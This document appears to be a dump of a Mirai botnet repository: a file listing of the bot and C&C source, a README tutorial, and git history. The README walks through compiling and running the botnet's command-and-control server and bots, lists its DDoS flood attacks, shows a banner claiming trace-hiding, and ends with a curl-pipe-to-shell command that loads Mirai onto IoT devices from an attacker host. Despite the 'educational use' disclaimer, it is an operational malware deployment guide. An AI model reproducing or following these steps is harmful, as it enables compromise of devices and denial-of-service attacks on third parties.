======================: FILES :======================
mirai
├── apache2.sh
├── bot
│   ├── attack_app.c
│   ├── attack.c
│   ├── attack_gre.c
│   ├── attack.h
│   ├── attack_tcp.c
│   ├── attack_udp.c
│   ├── checksum.c
│   ├── checksum.h
│   ├── config.h
│   ├── includes.h
│   ├── killer.c
│   ├── killer.h
│   ├── main.c
│   ├── protocol.h
│   ├── rand.c
│   ├── rand.h
│   ├── resolv.c
│   ├── resolv.h
│   ├── scanner.c
│   ├── scanner.h
│   ├── table.c
│   ├── table.h
│   ├── util.c
│   └── util.h
├── build.sh
├── cnc
│   ├── admin.go
│   ├── api.go
│   ├── attack.go
│   ├── bot.go
│   ├── clientList.go
│   ├── constants.go
│   ├── database.go
│   └── main.go
├── prompt.txt
├── README.md
├── setup.py
├── setup.sh
└── tools
    ├── badbot.c
    ├── compilers.sh
    ├── db.sql
    ├── enc.c
    ├── nogdb.c
    ├── scanListen.go
    ├── single_load.c
    └── wget.c

3 directories, 46 files
======================: README CONTENT :======================
# Mirai setup

## What you need:
- Working pihole setup
- Ubuntu / Debian based linux distribution (tested on elementary os)
- Copy of mirai source code

## What we will do
The goal is to setup and run mirai in an local environment.  
But a disclaimer at the beginning: Do not use this to actually attack somebody its only for educational use.
<br><br>

## Setup tools
### First we need to install some packages  

```
sudo apt install gcc golang electric-fence mysql-server mysql-client screen dialog python3 apache2 -y
```
<br>

### The next step is to install the cross compilers
```
sudo bash ./tools/compilers.sh
```
<br>

**Now please restart your bash for those changes to take effect**
<br>


### Now we can compile it for the first time :D
```
bash ./setup.sh
bash ./build.sh debug telnet
```
<br>

### Now we need to setup the database it's easy trust me.
Simply run:
```
cat ./tools/db.sql | sudo mysql
```
<br>

Now restart mysql to make sure all changes are loaded:
```
sudo systemctl restart mysql
```
<br>

### Now we need to change some settings.  
Simply run and type in your domain and dns server:
```
python3 setup.py
```
<br>

### Now we can compile it for the second time :D
```
bash ./build.sh debug telnet
```
<br>

### Now its time to setup pihole
To do this you need to login into pihole and go to Local DNS/DNS Records and type in the domain you used earlier in this tutorial and the ip of the server where the cnc is supposed to run on. **Don't forget to click on add!**
<br>

### And finlay we can run it!
To run the cnc use:
```
cd debug
screen -S mirai-cnc sudo ./cnc
```
<br>

To run a bot use:
```
cd debug
screen -S mirai-bot sudo ./mirai.dbg
```
<br>

To connect to the cnc using telnet use:
```
telnet localhost

You will be asked to login you can do that with the user we inserted earlier into the database it should look something like:

я люблю куриные наггетсы
пользователь: root
пароль: root

проверив счета... |
[+] DDOS | Succesfully hijacked connection
[+] DDOS | Masking connection from utmp+wtmp...
[+] DDOS | Hiding from netstat...
[+] DDOS | Removing all traces of LD_PRELOAD...
[+] DDOS | Wiping env libc.poison.so.1
[+] DDOS | Wiping env libc.poison.so.2
[+] DDOS | Wiping env libc.poison.so.3
[+] DDOS | Wiping env libc.poison.so.4
[+] DDOS | Setting up virtual terminal...
[!] Sharing access IS prohibited!
[!] Do NOT share your credentials!
Ready
root@botnet#
```
<br>

Finaly to see a list of attacks type:
```
root@botnet# ?
Available attack list
udp: UDP flood
dns: DNS resolver flood using the targets domain, input IP is ignored
stomp: TCP stomp flood
greip: GRE IP flood
greeth: GRE Ethernet flood
vse: Valve source engine specific flood
syn: SYN flood
ack: ACK flood
udpplain: UDP flood with less options. optimized for higher PPS
http: HTTP flood
```
<br>

### But wait there is more
We didn't see how to attack iot devices yet but first of all we need to compile the release binary's:
```
bash ./build.sh release telnet
```
<br>

Let's install the binary's to apache2:
```
cd release
sudo bash ../apache2.sh
```
<br>

Now lets run the cnc:
```
cd release
sudo screen -dmS mirai-cnc ./cnc
```
<br>

If you did everything right you can now load mirai onto a device with:
```
curl http://<your ip>/bins/bins.sh |sh
```
<br>
====================== GIT HISTORY: ======================
f3ba5f3 HEAD@{0}: clone: from https://github.com/Glowman554/mirai
commit f3ba5f390c7d1ed97033f749d348de282ee5ae12
Author: Glowman554 <glowman434@gmail.com>
Date:   Thu Aug 11 18:35:38 2022 +0200

    fixed  multiple definition of `LOCAL_ADDR';

commit dd2093226018a69755c8a0d24b6cfc7413c0ce6f
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Sat May 8 19:52:10 2021 +0200

    Update README.md

commit be99e05f740d77fe1bd637707f1ac704b75214c2
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Sat Apr 10 22:29:09 2021 +0200

    Update setup.py

commit 2e75203965a02c4a241e84e9c9e72da0b8a872a0
Merge: ef01666 beb5f7f
Author: Glowman554 <glowman434@gmail.com>
Date:   Sat Apr 10 01:54:48 2021 +0200

    Merge branch 'main' of https://github.com/Glowman554/mirai into main

commit ef016668d451eec20e3768cdc626eae99336b35b
Author: Glowman554 <glowman434@gmail.com>
Date:   Sat Apr 10 01:54:17 2021 +0200

    addded compiler for rpi

commit beb5f7f2573528f427fd4975322211914d763e9b
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Sat Apr 10 01:27:22 2021 +0200

    Update README.md

commit 265083de6a57c1c99be1cd808ffa0af88456bc4a
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Sat Apr 10 01:09:35 2021 +0200

    Update README.md

commit 76aaecd922d0b06792a4f64ae8a5f670eda34af3
Author: Glowman554 <glowman434@gmail.com>
Date:   Sat Apr 10 00:12:42 2021 +0200

    some more informations

commit 8aaa1d68a3f67fef3be34da34fd1d282e5a68ce5
Author: Glowman554 <glowman434@gmail.com>
Date:   Fri Apr 9 22:27:20 2021 +0200

    better build system

commit 3a116e57485c23bcd2ecbbdec33c4d38e9a3648d
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 17:44:56 2021 +0200

    Update build.sh

commit 8a0c438d290104db5be3a687d4eb848aef03b284
Author: root <root@janick.localdomain>
Date:   Fri Apr 9 17:21:16 2021 +0200

    some fixes

commit ae589f0c60548cd4e9c59a74cbcae52edf5f5a30
Author: root <root@janick.localdomain>
Date:   Fri Apr 9 16:56:26 2021 +0200

    better build script

commit 9aa9ab4d763e8a8ae8b34b16533d2669025eb017
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 15:21:30 2021 +0200

    Update README.md

commit 66c7323f99169e73c955a6e14bef39f24db8a3b5
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 15:18:14 2021 +0200

    Update README.md

commit 95e552c2fab4f31bff4cbc68f750cfcfe5b1a649
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 15:16:52 2021 +0200

    Update README.md

commit c03033ddadd337744d5bb9909199df5a16e4b136
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 15:15:07 2021 +0200

    Update README.md

commit 8af17c6162c1625ce06f60832072bb6ba9119161
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 15:10:41 2021 +0200

    Update README.md

commit 6299c682760b44c5320ab35c55bcac629f80157f
Author: Glowman554 <55138266+Glowman554@users.noreply.github.com>
Date:   Fri Apr 9 15:01:07 2021 +0200

    Update README.md

commit e13e1accada42f3ee02add4e447b4f171c0b7edf
Author: janick voss <vossjanick@gmail.com>
Date:   Fri Apr 9 14:20:46 2021 +0200

    added testet message

commit 7faa5966d3c7a989682c70d9755da19b55c1ef70
Author: janick voss <vossjanick@gmail.com>
Date:   Fri Apr 9 13:46:05 2021 +0200

    mirai tutorial
